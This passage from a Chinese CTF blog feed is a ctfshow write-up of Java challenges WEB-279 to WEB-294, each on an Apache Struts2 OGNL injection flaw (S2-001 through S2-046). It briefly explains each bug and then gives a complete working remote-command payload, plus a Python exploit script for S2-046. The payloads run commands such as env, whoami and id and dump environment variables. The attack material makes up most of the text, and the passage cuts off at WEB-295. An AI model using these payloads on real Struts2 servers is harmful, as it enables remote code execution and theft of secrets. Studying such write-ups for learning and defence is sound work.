href="http://162.14.111.237/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E4%B8%ADlinux%E5%BA%93%E6%96%87%E4%BB%B6%E5%8A%AB%E6%8C%81/">http://162.14.111.237/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E4%B8%ADlinux%E5%BA%93%E6%96%87%E4%BB%B6%E5%8A%AB%E6%8C%81/</a></p><p><a href="https://www.freebuf.com/column/162604.html">https://www.freebuf.com/column/162604.html</a></p><p>都是上好的文章</p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="EZ-misc"><a href="#EZ-misc" class="headerlink" title="EZ_misc"></a>EZ_misc</h2><p>跟之前*CTF考点一样 CVE-2023-28303</p><p><a href="https://github.com/frankthetank-music/Acropalypse-Multi-Tool">https://github.com/frankthetank-music/Acropalypse-Multi-Tool</a> 直接用工具梭哈恢复就行了</p>]]></content>
      
      
      <categories>
          
          <category> 各赛事WP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-java struts2框架一览</title>
      <link href="/post/faf20676.html"/>
      <url>/post/faf20676.html</url>
      
        <content type="html"><![CDATA[<p>ctfshow-java</p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>硬着头皮学习</p><p>好像这个系列讲的全是struts2框架漏洞 就当作是长见识了</p><p>Struts2是java语言写的的一个基于MVC设计模式的Web框架</p><p>struts2漏洞 S2-001是当用户提交表单数据且验证失败时，服务器使用OGNL表达式解析用户先前提交的参数值，<code>%&#123;value&#125;</code>并重新填充相应的表单数据。</p><p>这里的<code>%&#123;value&#125;</code>简单理解就是和flask的模板注入<code>&#123;&#123;&#125;&#125;</code>差不多 会对里面的内容进行解析</p><p>因此我们可以利用其进行命令执行</p><p>OGNL表达式中三个符号 <code>% # $</code> 的含义</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%的用途是在标志的属性为字符串类型时，计算OGNL表达式%&#123;&#125;中的值</span><br><span class="line">#的用途访主要是访问非根对象属性，因为Struts 2中值栈被视为根对象，所以访问其他非根对象时，需要加#前缀才可以调用</span><br><span class="line">$主要是在Struts 2配置文件中，引用OGNL表达式</span><br></pre></td></tr></table></figure><p>其次struts2引擎是我们熟悉的tomcat</p><p>github上有专门针对struts2的poc <a href="https://github.com/HatBoy/Struts2-Scan">https://github.com/HatBoy/Struts2-Scan</a> 不过我还是自己手动捯饬一下</p><h1 id="WEB-279-S2-001"><a href="#WEB-279-S2-001" class="headerlink" title="WEB-279(S2-001)"></a>WEB-279(S2-001)</h1><p>获取一些敏感路径的payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 获取tomcat路径</span><br><span class="line">%&#123;&quot;tomcatBinDir&#123;&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;&#125;&quot;&#125;</span><br><span class="line"></span><br><span class="line">// 获取web路径</span><br><span class="line">%&#123;#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#response.println(#req.getRealPath(&#x27;/&#x27;)),#response.flush(),#response.close()&#125;</span><br></pre></td></tr></table></figure><p>本题payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 命令执行 env，flag在环境变量中</span><br><span class="line">password=%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;env&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;&amp;username=1</span><br></pre></td></tr></table></figure><h1 id="WEB-280-S2-016和S2-005"><a href="#WEB-280-S2-016和S2-005" class="headerlink" title="WEB-280(S2-016和S2-005)"></a>WEB-280(S2-016和S2-005)</h1><p>S2-003</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Struts2将HTTP的每个参数名解析为ognl语句执行,而ognl表达式是通过#来访问struts的对象，Struts2框架虽然过滤了#来进行过滤，但是可以通过unicode编码（u0023）或8进制（43）绕过了安全限制，达到代码执行的效果</span><br><span class="line"></span><br><span class="line">影响版本：Struts 2.0.0 - Struts 2.0.11.2</span><br></pre></td></tr></table></figure><p>因此我们可以利用unicode编码和8进制来bypass <code>#</code></p><p>这道题目只能用这个poc做出来 网上的payload都没有回显 <a href="https://github.com/wyzmgmdg/Struts2Scan">https://github.com/wyzmgmdg/Struts2Scan</a></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1692946075903-915efd11-b4cb-492b-83f0-a95729ce7a62.png" alt="img"></p><p>然后S2-016和S2-005都能打通</p><p>或者</p><p>post传参</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redirect:$&#123;%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23s%3dnew%20java.util.Scanner((new%20java.lang.ProcessBuilder(%27%65%6e%76%27.toString().split(%27\\s%27))).start().getInputStream()).useDelimiter(%27\\AAAA%27),%23str%3d%23s.hasNext()?%23s.next():%27%27,%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().println(%23str),%23resp.getWriter().flush(),%23resp.getWriter().close()&#125;</span><br></pre></td></tr></table></figure><p>需要注意的是我们的命令必须要经过url全字符编码才能成功 也就是我标蓝这里 途中命令为env</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1692947661826-dd0d571e-eef9-4a67-a9c4-7c26bac99054.png" alt="img"></p><p>参考:<a href="https://github.com/vulhub/vulhub/blob/master/struts2/s2-005/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/struts2/s2-005/README.zh-cn.md</a></p><h1 id="WEB-281-S2-007"><a href="#WEB-281-S2-007" class="headerlink" title="WEB-281(S2-007)"></a>WEB-281(S2-007)</h1><p>原理:</p><p>当配置了验证规则 <ActionName>-validation.xml 时，若类型验证转换出错，后端默认会将用户提交的表单值通过字符串拼接，然后执行一次 OGNL 表达式解析并返回</p><p>当用户 age 以str而不是的形式提交时 int，服务器将拼接 <code>“‘“ + value + “‘“ </code>代码，然后使用OGNL表达式对其进行解析。为了成功完成任务，我们需要找到一个配置有相似验证规则的表单字段，以产生转换错误。然后，您可以通过注入SQL单引号的方式注入任何OGNL表达式代码</p><p>影响版本：Struts2 2.0.0 - Struts2 2.2.3</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#foo=new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;env&#x27;).getInputStream())) + &#x27;</span><br></pre></td></tr></table></figure><h1 id="WEB-282-S2-008"><a href="#WEB-282-S2-008" class="headerlink" title="WEB-282(S2-008)"></a>WEB-282(S2-008)</h1><p>原理:</p><p>S2-008 涉及多个漏洞，Cookie 拦截器错误配置可造成 OGNL 表达式执行，但是由于大多 Web 容器（如 Tomcat）对 Cookie 名称都有字符限制，一些关键字符无法使用使得这个点显得比较鸡肋。另一个比较鸡肋的点就是在 struts2 应用开启 devMode 模式后会有多个调试接口能够直接查看对象信息或直接执行命令，但是这种情况在生产环境中几乎不可能存在，所以还是很鸡肋。</p><p>影响版本：Struts 2.1.0 – 2.3.1</p><p>这道题目很奇怪只能用上面的poc脚本才能打成功 看了脚本的构造 payload如下</p><p>手动输入就是没有回显 反弹shell也是一样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/devmode.action?debug=command&amp;expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27cmd%27%29.getInputStream%28%29%29)</span><br></pre></td></tr></table></figure><h1 id="WEB-283-Struts2-showcase远程代码执行漏洞"><a href="#WEB-283-Struts2-showcase远程代码执行漏洞" class="headerlink" title="WEB-283(Struts2 showcase远程代码执行漏洞)"></a>WEB-283(Struts2 showcase远程代码执行漏洞)</h1><p>原理：</p><p>这个漏洞再次来源于s2-003、s2-005</p><p>参考Struts2漏洞分析之Ognl表达式特性引发的新思路，文中说到，该引入ognl的方法不光可能出现在这个漏洞中，也可能出现在其他java应用中</p><p>Struts2对s2-003的修复方法是禁止静态方法调用，在s2-005中可直接通过OGNL绕过该限制，对于<code>#</code>号，同样使用编码<code>\u0023</code>或<code>\43</code>进行绕过；于是Struts2对s2-005的修复方法是禁止<code>\</code>等特殊符号，使用户不能提交反斜线</p><p>但是，如果当前action中接受了某个参数example，这个参数将进入OGNL的上下文。所以，我们可以将OGNL表达式放在example参数中，然后使用<code>/helloword.acton?example=&lt;OGNL statement&gt;&amp;(example)(&#39;xxx&#39;)=1</code>的方法来执行它，从而绕过官方对<code>#、\</code>等特殊字符的防御</p><p>通过Struts2框架中ParametersInterceptor拦截器只检查传入的参数名而不检查参数值的方式进行构造OGNL表达式从而造成代码执行</p><p>payload: 来源于<a href="https://www.freebuf.com/articles/web/280245.html">https://www.freebuf.com/articles/web/280245.html</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/ajax/example5.action?age=12313&amp;name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27whoami%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&amp;z[(name)(%27meh%27)]</span><br></pre></td></tr></table></figure><h1 id="WEB-284-S2-012"><a href="#WEB-284-S2-012" class="headerlink" title="WEB-284(S2-012)"></a>WEB-284(S2-012)</h1><p>原理:</p><p>如果在配置 Action 中 Result 时使用了重定向类型，并且还使用 <code>$&#123;param_name&#125;</code> 作为重定向变量</p><p>比如:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">xml</span><br><span class="line">&lt;package name=&quot;S2-012&quot; extends=&quot;struts-default&quot;&gt;</span><br><span class="line">    &lt;action name=&quot;user&quot; class=&quot;com.demo.action.UserAction&quot;&gt;</span><br><span class="line">        &lt;result name=&quot;redirect&quot; type=&quot;redirect&quot;&gt;/index.jsp?name=$&#123;name&#125;&lt;/result&gt;</span><br><span class="line">        &lt;result name=&quot;input&quot;&gt;/index.jsp&lt;/result&gt;</span><br><span class="line">        &lt;result name=&quot;success&quot;&gt;/index.jsp&lt;/result&gt;</span><br><span class="line">    &lt;/action&gt;</span><br><span class="line">&lt;/package&gt;</span><br></pre></td></tr></table></figure><p>这里 UserAction 中定义有一个 name 变量，当触发 redirect 类型返回时，Struts2 获取使用 ${name} 获取其值，在这个过程中会对 name 参数的值执行 OGNL 表达式解析，从而可以插入任意 OGNL 表达式导致命令执行。</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;cat&quot;, &quot;/proc/self/environ&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure><h1 id="WEB-285-S2-013"><a href="#WEB-285-S2-013" class="headerlink" title="WEB-285(S2-013)"></a>WEB-285(S2-013)</h1><p>原理：</p><p>Apache Struts2的s:a和s:url标签都提供了一个includeParams属性。此属性允许使用的值包括none、get、all。当该属性被设置为get或all时，Apache Struts2会将用户提交的参数值作为Ognl表达式执行。攻击者可以提交带有恶意的Ongl表达式，达到执行任意Java代码的目的。只要基于Apache Struts2开发的JSP代码中使用了url&#x2F;a标签并且设置了includeParams属性为all或get，远程攻击者即可利用此漏执行任意命令。</p><p>payload: 参考:<a href="https://www.anquanke.com/post/id/266386#h3-3">https://www.anquanke.com/post/id/266386#h3-3</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">link.action?fakeParam=%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%27env%27).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(%27dbapp%3D%27%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D</span><br></pre></td></tr></table></figure><h1 id="WEB-286-S2-015"><a href="#WEB-286-S2-015" class="headerlink" title="WEB-286(S2-015)"></a>WEB-286(S2-015)</h1><p>原理：</p><p>在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵。恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令。</p><p>影响版本：</p><ul><li>Struts2.3.5 – 2.3.31</li><li>Struts2.5 – 2.5.10</li></ul><p>你妈 说是S2-015的漏洞 但是poc要用S2-045才能打通</p><p>而且用poc脚本打通S2-015里面没有flag</p><p>脚本或者</p><p>payload: 来源：<a href="https://www.hacking8.com/bug-product/Struts2/Struts2-S2-045%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C.html">https://www.hacking8.com/bug-product/Struts2/Struts2-S2-045%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C.html</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#nike=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#x27;env&#x27;).(#iswin=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(#cmds=(#iswin?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,#cmd&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1692955967130-30c47a51-06f3-4d81-8dfa-6b8dc8404498.png" alt="img"></p><h1 id="WEB-287-S2-016"><a href="#WEB-287-S2-016" class="headerlink" title="WEB-287(S2-016)"></a>WEB-287(S2-016)</h1><p>原理：</p><p>问题主要出在对于特殊URL处理中，redirect与redirectAction后面跟上Ognl表达式会被服务器执行</p><p>在struts2中，DefaultActionMapper类支持以”action:”、“redirect:”、”redirectAction:”作为导航或是重定向前缀，但是这些前缀后面同时可以跟OGNL表达式，由于struts2没有对这些前缀做过滤，导致利用OGNL表达式调用java静态方法执行任意系统命令</p><p>所以，访问<a href="http://your-ip:8080/index.action?redirect:OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%8D%B3%E5%8F%AF%E6%89%A7%E8%A1%8COGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F">http://your-ip:8080/index.action?redirect:OGNL表达式即可执行OGNL表达式</a></p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/default.action?redirect:$&#123;#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=false,#f=#_memberAccess.getClass().getDeclaredField(&quot;allowStaticMethodAccess&quot;),#f.setAccessible(true),#f.set(#_memberAccess,true),#a=@java.lang.Runtime@getRuntime().exec(&quot;env&quot;).getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[5000],#c.read(#d),#genxor=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#genxor.println(#d),#genxor.flush(),#genxor.close()&#125;</span><br></pre></td></tr></table></figure><p>需要注意的是提交的时候需要全字符编码</p><h1 id="WEB-288-S2-019"><a href="#WEB-288-S2-019" class="headerlink" title="WEB-288(S2-019)"></a>WEB-288(S2-019)</h1><p>原理：</p><p>要求开发者模式，且poc第一个参数是debug，触发点在DebuggingInterceptor上，查看intercept函数，从debug参数获取调试模式，如果模式是command，则把expression参数放到stack.findValue中，最终放到了ognl.getValue中</p><p>payload: 来源:<a href="https://www.freebuf.com/vuls/246969.html">https://www.freebuf.com/vuls/246969.html</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?debug=command&amp;expression=#a=(new java.lang.ProcessBuilder(&#x27;id&#x27;)).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#out=#context.get(&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;),#out.getWriter().println(new java.lang.String(#e)),#out.getWriter().flush(),#out.getWriter().close()</span><br></pre></td></tr></table></figure><p>主要url全字符编码的时候一定要把里面的<code>&amp;</code>别编码不然会混淆</p><h1 id="WEB-289-S2-029"><a href="#WEB-289-S2-029" class="headerlink" title="WEB-289(S2-029)"></a>WEB-289(S2-029)</h1><p>原理:</p><p>Struts框架被强制执行时，对分配给某些标签的属性值进行双重评估，因此可以传入一个值，当一个标签的属性将被渲染时，该值将被再次评估</p><p>例如：代码执行过程大致为先尝试获取value的值，如果value为空，那么就二次解释执行了name。并且在执行前给name加上了”%{}”。最终造成二次执行</p><p>影响版本：Struts 2.0.0 - Struts 2.3.24.1（2.3.20.3除外）</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/default.action?message=(%23_memberAccess[&#x27;allowPrivateAccess&#x27;]=true,%23_memberAccess[&#x27;allowProtectedAccess&#x27;]=true,%23_memberAccess[&#x27;excludedPackageNamePatterns&#x27;]=%23_memberAccess[&#x27;acceptProperties&#x27;],%23_memberAccess[&#x27;excludedClasses&#x27;]=%23_memberAccess[&#x27;acceptProperties&#x27;],%23_memberAccess[&#x27;allowPackageProtectedAccess&#x27;]=true,%23_memberAccess[&#x27;allowStaticMethodAccess&#x27;]=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;env&#x27;).getInputStream()))</span><br></pre></td></tr></table></figure><h1 id="WEB-290-S2-032"><a href="#WEB-290-S2-032" class="headerlink" title="WEB-290(S2-032)"></a>WEB-290(S2-032)</h1><p>原理:</p><p>Struts2在开启了动态方法调用（Dynamic Method Invocation）的情况下，可以使用method:<name>的方式来调用名字是<name>的方法，而这个方法名将会进行OGNL表达式计算，导致远程命令执行漏洞</p><p>影响版本: Struts 2.3.20 - Struts Struts 2.3.28 (except 2.3.20.3 and 2.3.24.3)</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;pp=%5C%5CA&amp;ppp=%20&amp;encoding=UTF-8&amp;cmd=env</span><br></pre></td></tr></table></figure><h1 id="WEB-291-S2-033"><a href="#WEB-291-S2-033" class="headerlink" title="WEB-291(S2-033)"></a>WEB-291(S2-033)</h1><p>原理:</p><p>当开启动态方法调用，并且同时使用了Strut2 REST Plugin插件时，使用“!”操作符调用动态方法可能执行ognl表达式，导致代码执行</p><p>影响版本：Struts 2.3.20 – Struts 2.3.28 (不包括 2.3.20.3和 2.3.24.3)</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/orders/4/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=2908&amp;command=env</span><br></pre></td></tr></table></figure><h1 id="WEB-292-S2-037"><a href="#WEB-292-S2-037" class="headerlink" title="WEB-292(S2-037)"></a>WEB-292(S2-037)</h1><p>原理:</p><p>当使用REST插件启用动态方法调用时，可以传递可用于在服务器端执行任意代码的恶意表达式</p><p>影响版本：Struts 2.3.20 - Struts Struts 2.3.28（2.3.20.3和2.3.24.3除外）</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/orders/3/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=2908&amp;command=whoami</span><br></pre></td></tr></table></figure><h1 id="WEB-293-S2-045"><a href="#WEB-293-S2-045" class="headerlink" title="WEB-293(S2-045)"></a>WEB-293(S2-045)</h1><p>原理:</p><p>在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵</p><p>恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令</p><p>影响版本：Struts 2.3.5 – Struts 2.3.31 Struts 2.5 – Struts 2.5.10</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: &quot;%&#123;(#nike=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#x27;whoami&#x27;).(#iswin=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(#cmds=(#iswin?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,#cmd&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;&quot; boundary=----WebKitFormBoundaryXx80aU0pu6vrsV3z</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1692960165492-0dc1a65d-933a-4280-9bbc-3ef12278f5d5.png" alt="img"></p><h1 id="WEB-294-S2-046"><a href="#WEB-294-S2-046" class="headerlink" title="WEB-294(S2-046)"></a>WEB-294(S2-046)</h1><p>原理：</p><p>S2-046漏洞和S2-045漏洞很相似，都是由于对Header某个字段信息处理发生异常，错误信息连带着payload同过buildErrorMessage函数带入LocalizedTextUtil.findText造成的。 但是不同的是，这次漏洞的触发点在Content-Length和Content-Disposition字段的filename中。</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># encoding:utf-8</span><br><span class="line">import requests</span><br><span class="line">class Sugarcrm():</span><br><span class="line">    def poctest(self):   </span><br><span class="line">        boundary=&quot;---------------------------735323031399963166993862150&quot;</span><br><span class="line">        paylaod=&quot;%&#123;(#nike=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#x27;env&#x27;).(#iswin=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(#cmds=(#iswin?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,#cmd&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;&quot;</span><br><span class="line">        url = &#x27;http://200258f8-842d-4e4b-a894-ea043fd0d046.challenge.ctf.show/S2-046/doUpload.action&#x27;</span><br><span class="line">        headers = &#123;&#x27;Content-Type&#x27;: &#x27;multipart/form-data; boundary=&#x27;+boundary+&#x27;&#x27;&#125;</span><br><span class="line">        data =&quot;--&quot;+boundary+&quot;\r\nContent-Disposition: form-data; name=\&quot;foo\&quot;; filename=\&quot;&quot;+paylaod+&quot;\0b\&quot;\r\nContent-Type: text/plain\r\n\r\nx\r\n--&quot;+boundary+&quot;--&quot;</span><br><span class="line">        rs=requests.post(url, headers=headers,data=data)</span><br><span class="line">        print(rs.text)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    test = Sugarcrm()</span><br><span class="line">    test.poctest()</span><br></pre></td></tr></table></figure><p>不懂。。。</p><h1 id="WEB-295-S2-048"><a href="#WEB-295-S2-048" class="headerlink" 